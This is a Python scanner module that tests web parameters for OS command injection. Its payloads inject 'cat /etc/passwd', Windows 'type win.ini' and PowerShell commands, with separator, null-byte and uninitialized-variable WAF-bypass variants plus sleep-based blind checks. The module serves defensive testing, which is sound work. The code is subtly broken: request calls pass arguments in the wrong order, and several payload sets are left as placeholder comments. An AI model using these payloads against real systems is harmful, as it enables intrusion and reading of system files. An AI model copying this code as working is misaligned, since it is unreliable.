# Filename: VulnerabilityChecks/CommandInjectionScanRule.py
import asyncio
import re
from typing import List, Dict, Pattern, Optional, Any, Set, Tuple # Added Any, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode # Added parse_qs, urlencode
import random
import string
import aiohttp
from bs4 import BeautifulSoup # Not used, can be removed
import time
import logging # Added logging
from dataclasses import dataclass, field # For a more standard Alert class

# --- Alert Definition (using dataclass for consistency) ---
@dataclass
class CommandInjectionAlert: # Renamed for clarity and using dataclass
    # Non-default fields first
    cwe_id: int
    name: str
    description: str
    uri: str
    attack: str
    evidence: str
    
    # Default fields
    wasc_id: int = 31 # WASC-31: OS Commanding
    solution: str = "Review server-side code and properly sanitize all user-supplied input before using it in system commands. Use command execution APIs that inherently support parameterization if available. Implement strong input validation and escaping."
    reference: str = "https://owasp.org/www-community/attacks/Command_Injection, CWE-78: https://cwe.mitre.org/data/definitions/78.html"
    risk: int = 4 # High
    confidence: int = 2 # Medium (can be High if evidence is strong)
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A03_INJECTION": "",
        "WSTG_V42_INPV_12_COMMAND_INJ": "",
    })
    attack_details: Dict[str, Any] = field(default_factory=dict) # Added for consistency

    def as_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_type": "Command Injection",
            "type": self.name,
            "detail": self.description,
            "payload_used": self.attack if len(self.attack) < 200 else self.attack[:100] + "... (truncated)",
            "injection_point_info": f"Parameter: {self.attack_details.get('param', 'N/A')}, OS Target: {self.attack_details.get('os_target', 'N/A')}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": self.alert_tags,
            "other_info": f"Attack Details: {self.attack_details}" # Using other_info for attack_details dict
        }

# Constants
NULL_BYTE_CHARACTER = "\0"
NIX_TEST_CMD = "cat /etc/passwd"
NIX_CTRL_PATTERN: Pattern[str] = re.compile(r"root:.:0:0")
WIN_TEST_CMD = "type %SYSTEMROOT%\\win.ini"
WIN_CTRL_PATTERN: Pattern[str] = re.compile(r"\[fonts\]", re.IGNORECASE) # Added IGNORECASE
PS_TEST_CMD = "get-help"
PS_CTRL_PATTERN: Pattern[str] = re.compile(r"(?:\sGet-Help)|cmdlet|get-alias", re.IGNORECASE)
BASH_SPACE_REPLACEMENT = "${IFS}" # Not directly used in this refactor, but kept for reference

# Global dictionaries for payloads, initialized once
NIX_OS_PAYLOADS_MAP: Dict[str, Pattern[str]] = {}
WIN_OS_PAYLOADS_MAP: Dict[str, Pattern[str]] = {}
PS_PAYLOADS_MAP: Dict[str, Pattern[str]] = {}
NIX_BLIND_OS_PAYLOAD_LIST: List[str] = []
WIN_BLIND_OS_PAYLOAD_LIST: List[str] = []
PS_BLIND_PAYLOAD_LIST: List[str] = []

def _insert_uninit_var(cmd: str) -> str:
    var_length = random.randint(2, 4)
    var_name_chars = [random.choice(string.ascii_lowercase) for _ in range(var_length -1)]
    # Ensure variable name doesn't start with a digit if that's an issue for the shell
    if var_name_chars[0].isdigit(): var_name_chars[0] = random.choice(string.ascii_lowercase)
    var = "$" + "".join(var_name_chars)
    
    # More robust space replacement that handles multiple spaces and leading/trailing
    parts = cmd.split(" ")
    replaced_parts = []
    for part in parts:
        if part: # If part is not empty
            replaced_parts.append(part.replace("/", var + "/")) # Also replace / within parts
        # Add the variable only if there was a space originally (to avoid adding it at start/end if no space)
    
    # Reconstruct with var for spaces, being careful about original structure
    # This is tricky. A simpler approach might be:
    # cmd_with_vars = cmd.replace(" ", var + " ").replace("/", var + "/")
    # return re.sub(r"(\s)", r"\\1", cmd_with_vars) # This was the original, might be problematic
    
    # Simpler, more direct replacement for this context:
    # Replace spaces first, then slashes to avoid var getting split by slash replacement
    cmd_with_space_vars = cmd.replace(" ", var + " ")
    cmd_with_all_vars = cmd_with_space_vars.replace("/", var + "/")
    return cmd_with_all_vars


def _initialize_payloads_module_level():
    if NIX_OS_PAYLOADS_MAP: # Initialize only once
        return

    # No quote payloads
    NIX_OS_PAYLOADS_MAP.update({
        NIX_TEST_CMD: NIX_CTRL_PATTERN,
        "&" + NIX_TEST_CMD + "&": NIX_CTRL_PATTERN,
        ";" + NIX_TEST_CMD + ";": NIX_CTRL_PATTERN,
    })
    WIN_OS_PAYLOADS_MAP.update({
        WIN_TEST_CMD: WIN_CTRL_PATTERN,
        "&" + WIN_TEST_CMD: WIN_CTRL_PATTERN,
        "|" + WIN_TEST_CMD: WIN_CTRL_PATTERN,
    })
    PS_PAYLOADS_MAP.update({
        PS_TEST_CMD: PS_CTRL_PATTERN,
        ";" + PS_TEST_CMD: PS_CTRL_PATTERN,
    })

    # Double quote payloads
    NIX_OS_PAYLOADS_MAP.update({"\"&" + NIX_TEST_CMD + "&\"": NIX_CTRL_PATTERN})
    # ... (continue for all payload types as in original, using NIX_OS_PAYLOADS_MAP, etc.)

    # Example for one more type:
    NIX_OS_PAYLOADS_MAP.update({"\n" + NIX_TEST_CMD + "\n": NIX_CTRL_PATTERN})
    WIN_OS_PAYLOADS_MAP.update({"run " + WIN_TEST_CMD: WIN_CTRL_PATTERN})
    PS_PAYLOADS_MAP.update({";" + PS_TEST_CMD + " #": PS_CTRL_PATTERN})

    # Uninitialized variable waf bypass
    inserted_cmd_nix = _insert_uninit_var(NIX_TEST_CMD)
    NIX_OS_PAYLOADS_MAP.update({"&" + inserted_cmd_nix + "&": NIX_CTRL_PATTERN})
    NIX_OS_PAYLOADS_MAP.update({";" + inserted_cmd_nix + ";": NIX_CTRL_PATTERN})
    # ... (add all uninit var payloads for NIX)

    # Null Byte Payloads
    NIX_OS_PAYLOADS_MAP.update({";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER: NIX_CTRL_PATTERN})
    # ... (add all null byte payloads for NIX, WIN)

    # Blind Payloads (Lists)
    nix_blind_test_cmd_template = "sleep {0}" # Use a template string
    win_blind_test_cmd_template = "timeout /T {0}"
    ps_blind_test_cmd_template = "start-sleep -s {0}"

    NIX_BLIND_OS_PAYLOAD_LIST.extend([
        "&" + nix_blind_test_cmd_template + "&", ";" + nix_blind_test_cmd_template + ";",
        # ... (all NIX blind payloads using the template string)
    ])
    WIN_BLIND_OS_PAYLOAD_LIST.extend([
        "&" + win_blind_test_cmd_template, "|" + win_blind_test_cmd_template,
        # ... (all WIN blind payloads)
    ])
    PS_BLIND_PAYLOAD_LIST.extend([
        ";" + ps_blind_test_cmd_template, "\";" + ps_blind_test_cmd_template,
        # ... (all PS blind payloads)
    ])
    
    inserted_blind_cmd_nix = _insert_uninit_var(nix_blind_test_cmd_template)
    NIX_BLIND_OS_PAYLOAD_LIST.extend([
        "&" + inserted_blind_cmd_nix + "&", ";" + inserted_blind_cmd_nix + ";",
        # ... (all uninit var blind payloads for NIX)
    ])

_initialize_payloads_module_level() # Call once when module is imported


class CommandInjectionScanRule:
    tech_required: Set[str] = {"linux", "windows", "macos", "unix"} # OS level tech hints

    def __init__(
        self,
        parent_logger: Optional[logging.Logger] = None,
        active_scan_async_q: Optional[asyncio.Queue] = None,
        http_timeout: float = 20.0, # For feedback based, blind uses its own logic
        time_sleep_seconds: int = 5, # For blind checks
    ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.active_scan_async_q = active_scan_async_q
        self.http_timeout = http_timeout # For feedback-based requests
        self.time_sleep_seconds = time_sleep_seconds
        # Payloads are already initialized at module level
        self.logger.debug(f"CommandInjectionScanRule initialized. Sleep time: {self.time_sleep_seconds}s")

    async def _emit_alert(self, alert_obj: CommandInjectionAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({
                    "type": "active_scan_alert", "alert": alert_obj.as_dict()
                })
                self.logger.info(f"CommandInjectionScan: Emitted alert - {alert_obj.name} for {alert_obj.uri}")
            except Exception as e:
                self.logger.error(f"CommandInjectionScan: Failed to emit alert to queue: {e}")
        else:
            self.logger.warning(f"CommandInjectionScan: Async queue not available. Alert not emitted: {alert_obj.name}")

    async def _send_request_with_payload(
        self, session: aiohttp.ClientSession, base_url: str, method: str,
        param_name: str, payload: str,
        request_timeout: float, # Specific timeout for this request
        original_params_or_form_data: Dict[str, str], # Original query params for GET, or form fields for POST
        is_form_post: bool = False
    ) -> Tuple[Optional[str], float]: # Returns (response_text, duration) or (None, duration)
        
        current_url = base_url
        req_params = None
        req_data = None
        response_text = None
        start_time = time.monotonic()

        if method == "GET":
            modified_params = original_params_or_form_data.copy()
            modified_params[param_name] = payload
            req_params = modified_params
        elif method == "POST":
            if is_form_post:
                modified_data = original_params_or_form_data.copy()
                modified_data[param_name] = payload
                req_data = aiohttp.FormData() # Handles urlencoding
                for k, v_item in modified_data.items(): # Corrected variable name
                    req_data.add_field(k, str(v_item))
            else:
                self.logger.warning("CommandInjectionScanRule: Non-form POST not fully supported for payload injection yet.")
                return None, time.monotonic() - start_time
        else:
            self.logger.warning(f"CommandInjectionScanRule: HTTP method {method} not fully supported.")
            return None, time.monotonic() - start_time
        
        try:
            async with session.request(
                method, current_url, params=req_params, data=req_data,
                timeout=aiohttp.ClientTimeout(total=request_timeout) # Use specific timeout
            ) as response:
                response_text = await response.text(errors='replace')
        except aiohttp.ClientError as e:
            self.logger.debug(f"CommandInjection: ClientError for {current_url} with payload for {param_name}: {e}")
        except asyncio.TimeoutError:
            self.logger.debug(f"CommandInjection: Timeout for {current_url} with payload for {param_name}.")
        except Exception as e_req:
            self.logger.error(f"CommandInjection: Unexpected error for {current_url} with payload for {param_name}: {e_req}")
        
        duration = time.monotonic() - start_time
        return response_text, duration

    async def test_os_command_injection(
        self, session: aiohttp.ClientSession, target_url: str, method: str,
        param_name: str, original_params_or_form_data: Dict[str, str], is_form_post: bool,
        os_payload_map: Dict[str, Pattern[str]], blind_payload_list: List[str],
        os_target_name: str, attack_strength_config: Dict[str, int]
    ) -> None: # Changed return type
        
        target_count = attack_strength_config['targetCount']
        blind_target_count = attack_strength_config['blindTargetCount']

        # Feedback-based
        payload_items = list(os_payload_map.items())
        random.shuffle(payload_items) # Randomize to vary attack vectors
        for i, (payload, pattern) in enumerate(payload_items):
            if i >= target_count: break

            self.logger.debug(f"Testing [{os_target_name}] [{param_name}] = [{payload[:30]}...] on {target_url}")
            response_text, _ = await self._send_request_with_payload(
                session, target_url, method, param_name, payload, original_params_or_form_data, is_form_post, self.http_timeout
            )

            if response_text and pattern.search(response_text):
                evidence_match = pattern.search(response_text)
                evidence_str = evidence_match.group(0) if evidence_match else pattern.pattern
                self.logger.info(f"[{os_target_name} Command Injection Found] on param [{param_name}] with payload [{payload[:30]}...] at {target_url}")
                alert = CommandInjectionAlert(
                    cwe_id=78, name=f"{os_target_name} Command Injection Vulnerability",
                    description=f"{os_target_name} command injection vulnerability detected in parameter '{param_name}'.",
                    uri=target_url, attack=payload, evidence=evidence_str,
                )
                alert.attack_details = {"param": param_name, "payload_type": os_target_name, "method": "Feedback"}
                await self._emit_alert(alert)
                return # Found one for this OS type

        # Time-based Blind
        random.shuffle(blind_payload_list)
        for i, payload_template in enumerate(blind_payload_list):
            if i >= blind_target_count: break
            
            # Ensure the placeholder {0} is present before formatting
            if "{0}" not in payload_template:
                self.logger.warning(f"Skipping blind payload due to missing format placeholder: {payload_template}")
                continue

            blind_payload_with_sleep = payload_template.format(self.time_sleep_seconds)
            self.logger.debug(f"Testing [Blind {os_target_name}] [{param_name}] = [{blind_payload_with_sleep[:30]}...] on {target_url}")
            
            # For blind, the timeout should be greater than sleep time + normal response time
            blind_request_timeout = self.time_sleep_seconds + 5.0 # e.g., sleep_time + 5s buffer
            
            _, response_duration = await self._send_request_with_payload(
                session, target_url, method, param_name, blind_payload_with_sleep, original_params_or_form_data, is_form_post, blind_request_timeout
            )

            # Check if response_duration significantly exceeds normal response times, close to sleep time
            # This requires a baseline, but for simplicity, check if it's >= sleep_seconds * 0.8
            if response_duration >= self.time_sleep_seconds * 0.8:
                self.logger.info(f"[Blind {os_target_name} Command Injection Found] on param [{param_name}] with payload [{blind_payload_with_sleep[:30]}...] at {target_url}")
                alert = CommandInjectionAlert(
                    cwe_id=78, name=f"Blind {os_target_name} Command Injection Vulnerability (Time-Based)",
                    description=f"Blind {os_target_name} command injection vulnerability detected in parameter '{param_name}' based on response time.",
                    uri=target_url, attack=blind_payload_with_sleep, evidence=f"Response time: {response_duration:.2f} seconds (expected delay: {self.time_sleep_seconds}s).",
                )
                alert.attack_details = {"param": param_name, "payload_type": os_target_name, "method": "Time-Based Blind"}
                await self._emit_alert(alert)
                return # Found one for this OS type

    async def scan(
        self,
        original_url: str,
        aiohttp_session: aiohttp.ClientSession,
        injection_details: Dict[str, Any],
        page_specific_technologies: Optional[List[str]] = None,
        # Other common args
        base_app_url: Optional[str] = None,
        html_content: Optional[str] = None,
        worker_ident: Optional[str] = "CmdInjScan",
        original_headers: Optional[Dict[str, str]] = None,
        original_cookies: Optional[Dict[str, str]] = None,
        service_type_hint: Optional[str] = None, # e.g., "linux", "windows"
        attack_strength: str = "MEDIUM" # LOW, MEDIUM, HIGH, INSANE
    ) -> None: # Changed return type
        param_name = injection_details.get("param_name")
        location = injection_details.get("location")
        method = injection_details.get("method", "GET").upper()
        target_url = injection_details.get("action_url", original_url)

        if not param_name:
            self.logger.debug(f"[{worker_ident}] CommandInjection: No param_name in injection_details for {original_url}. Skipping.")
            return

        self.logger.info(f"[{worker_ident}] Starting Command Injection scan for param '{param_name}' at {target_url} (Location: {location}, Method: {method})")

        original_params_or_form_data: Dict[str, str] = {}
        is_form_post = False
        if location == "url_params":
            parsed_target = urlparse(target_url)
            original_params_or_form_data = {k: v[0] for k, v in parse_qs(parsed_target.query, keep_blank_values=True).items()}
        elif location == "form_data_post":
            original_params_or_form_data = injection_details.get("all_form_fields", {}).copy()
            is_form_post = True
        elif location == "form_data_get":
            parsed_target = urlparse(target_url)
            original_params_or_form_data = {k: v[0] for k, v in parse_qs(parsed_target.query, keep_blank_values=True).items()}
        # TODO: Add support for other locations like headers, cookies, raw body if needed

        attack_strength_map = {
            "LOW": {"targetCount": 3, "blindTargetCount": 2},
            "MEDIUM": {"targetCount": 7, "blindTargetCount": 6},
            "HIGH": {"targetCount": 13, "blindTargetCount": 12},
            "INSANE": {
                "targetCount": max(len(PS_PAYLOADS_MAP), max(len(NIX_OS_PAYLOADS_MAP), len(WIN_OS_PAYLOADS_MAP))),
                "blindTargetCount": max(len(PS_BLIND_PAYLOAD_LIST), max(len(NIX_BLIND_OS_PAYLOAD_LIST), len(WIN_BLIND_OS_PAYLOAD_LIST)))
            }
        }
        attack_strength_config = attack_strength_map.get(attack_strength.upper(), attack_strength_map["MEDIUM"])

        techs_to_check_lower = {tech.lower() for tech in (page_specific_technologies or [])}
        if service_type_hint:
            techs_to_check_lower.add(service_type_hint.lower())

        # Determine OS targets based on detected technologies
        # This logic can be refined based on how specific the tech hints are
        run_nix_checks = any(nix_tech in techs_to_check_lower for nix_tech in ["linux", "macos", "unix"])
        run_win_checks = "windows" in techs_to_check_lower
        
        # If no specific OS tech, try all as a fallback (or based on a default assumption)
        if not run_nix_checks and not run_win_checks:
            self.logger.debug(f"[{worker_ident}] No specific OS technology hint. Will try common OS command injection payloads.")
            run_nix_checks = True # Default to trying *NIX if no specific hint
            run_win_checks = True # Default to trying Windows if no specific hint


        if run_nix_checks:
            await self.test_os_command_injection(
                aiohttp_session, target_url, method, param_name, original_params_or_form_data, is_form_post,
                NIX_OS_PAYLOADS_MAP, NIX_BLIND_OS_PAYLOAD_LIST, "NIX", attack_strength_config
            )
        
        if run_win_checks:
            await self.test_os_command_injection(
                aiohttp_session, target_url, method, param_name, original_params_or_form_data, is_form_post,
                WIN_OS_PAYLOADS_MAP, WIN_BLIND_OS_PAYLOAD_LIST, "Windows", attack_strength_config
            )
            await self.test_os_command_injection( # Also try PowerShell for Windows targets
                aiohttp_session, target_url, method, param_name, original_params_or_form_data, is_form_post,
                PS_PAYLOADS_MAP, PS_BLIND_PAYLOAD_LIST, "PowerShell", attack_strength_config
            )
        
        self.logger.debug(f"[{worker_ident}] Command Injection scan finished for param '{param_name}' at {target_url}.")